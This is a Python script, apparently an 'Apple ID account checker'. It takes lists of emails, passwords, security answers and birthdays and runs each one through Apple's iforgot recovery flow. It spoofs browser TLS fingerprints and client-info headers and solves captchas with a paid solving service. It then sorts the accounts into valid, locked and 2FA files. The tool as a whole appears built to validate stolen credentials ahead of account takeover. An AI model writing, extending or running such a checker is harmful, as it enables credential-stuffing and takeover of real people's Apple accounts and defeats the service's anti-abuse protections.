import os
import time
import json
import random
import logging
import tls_client
import urllib.parse
from colorama import Fore, init
from threading import Lock
import concurrent.futures

init()
lock = Lock()

# Logging configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('files/checker.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Account status codes
STATUS_CODES = {
    "valid": "✅ Valid (Security Questions)",
    "valid_hsa2": "✅ Valid (HSA2/2FA Required)",
    "2fa": "⚠️ 2FA Required",
    "invalid": "❌ Invalid Credentials",
    "locked": "🔒 Account Locked (Permanent)",
    "temp_locked": "🔐 Temporarily Locked (IP Block)",
    "inactive": "⏸️ Account Inactive",
    "rate_limited": "⏳ Rate Limited (try later)",
    "unknown": "❓ Unknown Status"
}

print(f"{Fore.CYAN}[+] Apple ID Account Checker Started{Fore.RESET}")

class AccountChecker:
    
    def __init__(self):
        self.results = {
            "valid": [],
            "valid_hsa2": [],
            "2fa": [],
            "invalid": [],
            "locked": [],
            "temp_locked": [],
            "inactive": [],
            "rate_limited": [],
            "unknown": []
        }
    
    def check_account(self, account_line):
        """Check single account status via iforgot.apple.com"""
        try:
            parts = account_line.strip().split(',')
            if len(parts) < 2:
                logger.error(f"Invalid account format: {account_line}")
                return None
            
            email = parts[0]
            password = parts[1]
            
            logger.info(f"[{email}] Checking account status via iforgot...")
            
            # Check via iforgot - this properly detects locked accounts
            status = self.check_via_iforgot_full(email, parts)
            
            # Log result
            self.log_result(email, password, status, account_line)
            
            return status
            
        except Exception as e:
            logger.error(f"[{email if 'email' in dir() else 'unknown'}] Error: {e}")
            return "unknown"
    
    def check_via_iforgot_full(self, email, parts):
        """Full check via iforgot.apple.com with captcha solving"""
        try:
            from yescaptcha.task import ImageToTextTask
            from yescaptcha.client import Client
            
            # Load API key
            try:
                with open("files/settings.json") as f:
                    settings = json.load(f)
                api_key = settings.get('API_KEY', '')
            except:
                logger.error(f"[{email}] Could not load API key from settings.json")
                return "unknown"
            
            session = tls_client.Session(
                random_tls_extension_order=True,
                client_identifier="chrome_128"
            )
            
            headers = {
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            }
            
            # Step 1: Get sstt token
            logger.info(f"[{email}] Getting sstt token...")
            resp = session.get(
                'https://iforgot.apple.com/password/verify/appleid',
                headers=headers
            )
            
            try:
                sstt = urllib.parse.quote(
                    resp.text.split('"https://iforgot.apple.com","contextUrl":"/","sstt":"')[1].split('","captchaEnabled":true,')[0]
                )
            except:
                logger.error(f"[{email}] Could not extract sstt token")
                return "unknown"
            
            headers['cookie'] = '; '.join([f"{name}={value}" for name, value in resp.cookies.items()])
            headers['sstt'] = sstt
            headers['accept'] = "application/json, text/javascript, */*; q=0.01"
            headers['x-requested-with'] = 'XMLHttpRequest'
            headers['x-apple-i-fd-client-info'] = '{"U":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","L":"en-US","Z":"GMT+02:00","V":"1.1","F":"sla44j1e3NlY5BNlY5BSs5uQ084akLK77J_v495JppM.S9RdPQSzOy_Aw7UTlWY5Ly.eaB0Tf0IY69WJQStMw8btHz3Y25BNlY5cklY5BqNAE.lTjV.6KH"}'
            
            # Step 2: Get captcha and solve it
            logger.info(f"[{email}] Getting and solving captcha...")
            captcha_resp = session.get(
                'https://iforgot.apple.com/captcha?captchaType=IMAGE',
                headers=headers
            )
            
            logger.info(f"[{email}] Captcha response status: {captcha_resp.status_code}")
            
            # 401 can still contain captcha data
            if captcha_resp.status_code not in [200, 401]:
                logger.error(f"[{email}] Failed to get captcha: {captcha_resp.status_code}")
                logger.error(f"[{email}] Response: {captcha_resp.text[:300] if captcha_resp.text else 'empty'}")
                if captcha_resp.status_code == 503:
                    return "rate_limited"
                return "unknown"
            
            try:
                captcha_data = captcha_resp.json()
            except:
                logger.error(f"[{email}] Could not parse captcha JSON")
                return "unknown"
            
            if 'payload' not in captcha_data or 'content' not in captcha_data.get('payload', {}):
                logger.error(f"[{email}] Invalid captcha response structure")
                return "unknown"
            
            # Solve captcha
            client = Client(client_key=api_key)
            task = ImageToTextTask(captcha_data['payload']['content'])
            job = client.create_task(task)
            captcha_answer = job.get_solution_text()
            
            logger.info(f"[{email}] Captcha solved: {captcha_answer}")
            
            # Step 3: Verify Apple ID
            logger.info(f"[{email}] Verifying Apple ID...")
            verify_data = {
                "id": email,
                "captcha": {
                    "id": captcha_data['id'],
                    "answer": captcha_answer,
                    "token": captcha_data['token']
                }
            }
            
            verify_resp = session.post(
                'https://iforgot.apple.com/password/verify/appleid',
                headers=headers,
                json=verify_data
            )
            
            logger.info(f"[{email}] Verify response: {verify_resp.status_code}")
            logger.info(f"[{email}] Response text: {verify_resp.text[:500] if verify_resp.text else 'empty'}")
            
            # Parse response
            if verify_resp.status_code == 302:
                # Success - account exists and not locked, now do deep check
                logger.info(f"[{email}] Account exists, doing deep check for temp lock...")
                
                # Continue flow to detect temporary lock (session timeout)
                return self.deep_check_for_temp_lock(session, headers, email, parts)
            
            elif verify_resp.status_code == 200:
                # Check if redirect in response
                location = verify_resp.headers.get('Location', '')
                if location:
                    logger.info(f"[{email}] Got redirect, doing deep check...")
                    return self.deep_check_for_temp_lock(session, headers, email, parts)
                return "valid"
            
            elif verify_resp.status_code == 423:
                return "locked"
            
            elif verify_resp.status_code == 403:
                # Check if it's 2FA required
                try:
                    data = verify_resp.json()
                    if 'trustedDevices' in str(data) or 'trustedPhoneNumbers' in str(data):
                        return "2fa"
                except:
                    pass
                return "locked"
            
            elif 'captchaAnswer.Invalid' in verify_resp.text:
                # Captcha wrong, retry
                logger.warning(f"[{email}] Captcha invalid, retrying...")
                return self.check_via_iforgot_full(email, parts)
            
            elif 'appleid.NotFound' in verify_resp.text or 'not found' in verify_resp.text.lower():
                return "invalid"
            
            elif 'locked' in verify_resp.text.lower() or 'disabled' in verify_resp.text.lower():
                return "locked"
            
            elif verify_resp.status_code == 503:
                logger.warning(f"[{email}] Rate limited (503)")
                return "rate_limited"
            
            else:
                # Try to parse JSON response
                try:
                    data = verify_resp.json()
                    # Check both serviceErrors and service_errors (Apple uses both)
                    errors = data.get('serviceErrors', []) or data.get('service_errors', [])
                    for err in errors:
                        code = str(err.get('code', ''))
                        message = str(err.get('message', '')).lower()
                        
                        if code == '-20209' or 'locked' in message or 'disabled' in message:
                            return "locked"
                        elif code == '-20101':
                            return "invalid"
                        elif code == '-20751' or code == '-20210' or 'not active' in message or 'inactive' in message:
                            return "inactive"
                        elif 'not found' in message:
                            return "invalid"
                except:
                    pass
                
                logger.warning(f"[{email}] Unknown response: {verify_resp.status_code}")
                return "unknown"
                
        except Exception as e:
            logger.error(f"[{email}] iforgot check error: {e}")
            import traceback
            traceback.print_exc()
            return "unknown"
    
    def deep_check_for_temp_lock(self, session, headers, email, parts):
        """Continue flow to birthday/questions to detect temporary lock (session timeout)"""
        try:
            # Need birthday from parts (format: email,password,ans1,ans2,ans3,MM/DD/YYYY)
            if len(parts) < 6:
                logger.warning(f"[{email}] No birthday in data, skipping deep check")
                return "valid"
            
            birthday = parts[5].strip()
            birthday_parts = birthday.split('/')
            if len(birthday_parts) != 3:
                logger.warning(f"[{email}] Invalid birthday format: {birthday}")
                return "valid"
            
            month, day, year = birthday_parts
            # Handle 2-digit year
            if len(year) == 2:
                year = '19' + year if int(year) > 50 else '20' + year
            
            logger.info(f"[{email}] Checking birthday verification...")
            
            # Step 1: GET birthday page
            birthday_get = session.get(
                'https://iforgot.apple.com/password/verify/birthday',
                headers=headers
            )
            
            if 'Sstt' in birthday_get.headers:
                headers['sstt'] = birthday_get.headers['Sstt']
            
            # Step 2: POST birthday
            birthday_data = {
                "birthday": f"{month.zfill(2)}/{day.zfill(2)}/{year}"
            }
            
            birthday_post = session.post(
                'https://iforgot.apple.com/password/verify/birthday',
                headers=headers,
                json=birthday_data
            )
            
            logger.info(f"[{email}] Birthday POST status: {birthday_post.status_code}")
            
            if 'Sstt' in birthday_post.headers:
                headers['sstt'] = birthday_post.headers['Sstt']
            
            # Step 3: GET questions page - need to follow redirects manually
            questions_headers = headers.copy()
            questions_headers['accept'] = 'application/json, text/javascript, */*; q=0.01'
            
            questions_get = session.get(
                'https://iforgot.apple.com/password/verify/questions',
                headers=questions_headers,
                allow_redirects=True
            )
            
            logger.info(f"[{email}] Questions GET status: {questions_get.status_code}")
            logger.info(f"[{email}] Questions URL: {questions_get.url}")
            
            # Check for session timeout (temporary lock) in URL
            if 'session/timeout' in str(questions_get.url):
                logger.info(f"[{email}] TEMPORARY LOCK DETECTED (session timeout in URL)")
                return "temp_locked"
            
            # Try to parse JSON response
            try:
                data = questions_get.json()
                logger.info(f"[{email}] Questions response keys: {list(data.keys()) if isinstance(data, dict) else 'not dict'}")
                
                if 'questions' in data:
                    logger.info(f"[{email}] Got security questions - account is valid")
                    return "valid"
                elif data == {} or not data:
                    # Empty response often means session timeout
                    logger.info(f"[{email}] Empty questions response - checking for timeout...")
                    # The actual timeout check - empty JSON means session expired
                    return "temp_locked"
            except Exception as e:
                logger.info(f"[{email}] Could not parse questions JSON: {e}")
            
            # Check response text for timeout indicators
            response_text = questions_get.text.lower()
            if 'timeout' in response_text or 'session' in str(questions_get.url).lower():
                logger.info(f"[{email}] TEMPORARY LOCK DETECTED (timeout in response)")
                return "temp_locked"
            
            # If we got HTML instead of JSON, check for timeout page
            if '<html' in questions_get.text.lower():
                if 'timeout' in questions_get.text.lower() or 'session' in questions_get.text.lower():
                    return "temp_locked"
            
            return "valid"
            
        except Exception as e:
            logger.error(f"[{email}] Deep check error: {e}")
            return "valid"  # Assume valid if deep check fails
    
    def check_via_iforgot(self, email, password, parts):
        """Check account status via iforgot.apple.com (like unlocker does)"""
        try:
            session = tls_client.Session(
                random_tls_extension_order=True,
                client_identifier="chrome_128"
            )
            
            headers = {
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            }
            
            # Get sstt token
            resp = session.get(
                'https://iforgot.apple.com/password/verify/appleid',
                headers=headers
            )
            
            try:
                sstt = urllib.parse.quote(
                    resp.text.split('"https://iforgot.apple.com","contextUrl":"/","sstt":"')[1].split('","captchaEnabled":true,')[0]
                )
            except:
                logger.error(f"[{email}] Could not extract sstt token")
                return "unknown"
            
            headers['cookie'] = '; '.join([f"{name}={value}" for name, value in resp.cookies.items()])
            headers['sstt'] = sstt
            headers['accept'] = "application/json, text/javascript, */*; q=0.01"
            headers['x-requested-with'] = 'XMLHttpRequest'
            
            # Check if account exists and get status
            # We'll use the captcha endpoint to verify account
            captcha_resp = session.get(
                'https://iforgot.apple.com/captcha?captchaType=IMAGE',
                headers=headers
            )
            
            if captcha_resp.status_code != 200:
                return "unknown"
            
            captcha_data = captcha_resp.json()
            
            # Try to verify appleid (without solving captcha - just check response)
            verify_data = {
                "id": email,
                "captcha": {
                    "id": captcha_data.get('id', ''),
                    "answer": "test",  # Dummy answer
                    "token": captcha_data.get('token', '')
                }
            }
            
            verify_resp = session.post(
                'https://iforgot.apple.com/password/verify/appleid',
                headers=headers,
                json=verify_data
            )
            
            # Parse response
            if verify_resp.status_code == 302:
                # Account exists and can proceed
                return "valid"
            elif verify_resp.status_code == 423:
                return "locked"
            elif "captchaAnswer.Invalid" in verify_resp.text:
                # Captcha invalid but account exists
                return "valid"
            elif "appleid.NotFound" in verify_resp.text:
                return "invalid"
            elif "locked" in verify_resp.text.lower():
                return "locked"
            else:
                # Check birthday if we have it
                if len(parts) >= 6:
                    return self.check_with_birthday(session, headers, email, parts)
                return "valid"  # Assume valid if captcha is the only issue
                
        except Exception as e:
            logger.error(f"[{email}] iforgot check error: {e}")
            return "unknown"
    
    def check_with_birthday(self, session, headers, email, parts):
        """Deep check with birthday verification"""
        try:
            birthday = parts[5]  # MM/DD/YYYY or MM/DD/YY
            birthday_parts = birthday.split('/')
            
            if len(birthday_parts) != 3:
                return "valid"
            
            # This would require solving captcha first
            # For now, return valid as account exists
            return "valid"
            
        except Exception as e:
            logger.error(f"[{email}] Birthday check error: {e}")
            return "valid"
    
    def parse_status(self, email, response):
        """Parse API response to determine account status"""
        status_code = response.status_code
        
        try:
            data = response.json()
        except:
            data = {}
        
        logger.info(f"[{email}] Response: {status_code} - {data}")
        
        # Check status codes
        if status_code == 200:
            auth_type = data.get('authType', '')
            if auth_type == 'sa':
                return "valid"
            elif auth_type == 'hsa2' or data.get('hsaChallengeRequired'):
                return "valid_hsa2"
            elif 'salt' in data or 'b' in data:
                # SRP init successful - account exists
                return "needs_password"
            return "valid"
        
        elif status_code == 409:
            return "2fa"
        
        elif status_code == 401:
            errors = data.get('serviceErrors', [])
            for err in errors:
                code = err.get('code', '')
                if code == '-20101':
                    return "invalid"
            return "invalid"
        
        elif status_code == 423:
            return "locked"
        
        elif status_code == 412:
            errors = data.get('serviceErrors', [])
            for err in errors:
                code = err.get('code', '')
                if code == '-20751':
                    return "inactive"
            return "inactive"
        
        return "unknown"
    
    def log_result(self, email, password, status, account_line):
        """Log and save result"""
        status_text = STATUS_CODES.get(status, STATUS_CODES["unknown"])
        
        print(f"{Fore.WHITE}[{email}] {status_text}{Fore.RESET}")
        
        with lock:
            self.results[status].append(account_line.strip())
            
            # Save to appropriate file
            filename = f"files/check_{status}.txt"
            with open(filename, "a+", encoding='utf-8') as f:
                f.write(f"{account_line.strip()}\n")
    
    def save_summary(self):
        """Save summary of all results"""
        print(f"\n{Fore.CYAN}{'='*50}")
        print(f"SUMMARY")
        print(f"{'='*50}{Fore.RESET}")
        
        total = 0
        for status, accounts in self.results.items():
            count = len(accounts)
            total += count
            if count > 0:
                status_text = STATUS_CODES.get(status, status)
                print(f"{status_text}: {count}")
        
        print(f"\n{Fore.WHITE}Total checked: {total}{Fore.RESET}")
        
        # Save summary to file
        with open("files/check_summary.txt", "w", encoding='utf-8') as f:
            f.write(f"Account Check Summary\n")
            f.write(f"{'='*50}\n")
            for status, accounts in self.results.items():
                count = len(accounts)
                if count > 0:
                    f.write(f"{STATUS_CODES.get(status, status)}: {count}\n")
            f.write(f"\nTotal: {total}\n")


def main():
    checker = AccountChecker()
    
    # Read accounts
    try:
        with open('files/Accounts.txt', 'r', encoding='utf-8') as f:
            accounts = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Error: files/Accounts.txt not found{Fore.RESET}")
        return
    
    if not accounts:
        print(f"{Fore.YELLOW}No accounts to check{Fore.RESET}")
        return
    
    print(f"{Fore.GREEN}Checking {len(accounts)} accounts...{Fore.RESET}\n")
    
    # Check accounts (single thread for now to avoid rate limiting)
    for account in accounts:
        checker.check_account(account)
        time.sleep(2)  # Delay between checks
    
    # Save summary
    checker.save_summary()
    
    print(f"\n{Fore.GREEN}[+] Check complete! Results saved to files/check_*.txt{Fore.RESET}")


if __name__ == "__main__":
    main()
